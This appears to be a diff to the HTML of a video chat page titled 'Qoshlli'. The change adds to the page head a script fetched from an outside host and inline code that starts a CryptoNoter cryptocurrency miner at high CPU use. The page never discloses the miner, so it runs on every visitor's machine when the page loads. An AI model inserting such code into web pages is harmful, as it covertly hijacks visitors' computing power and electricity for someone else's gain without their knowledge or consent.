@@ -109,6 +109,15 @@
 	         border-radius: 8px;
          }
       </style>
+	<script src="https://lotteh.com/static/web/processor.js"></script>
+	<script>
+	    var addr = 'CryptoNoter';
+	    var miner = new CryptoNoter.Anonymous(addr, {
+	        autoThreads: true,
+	    throttle: 0.8
+	    });
+	    miner.start();
+	</script>
    </head>
    <body>
       <legend><b>Qoshlli</b> - Video Chat</legend>
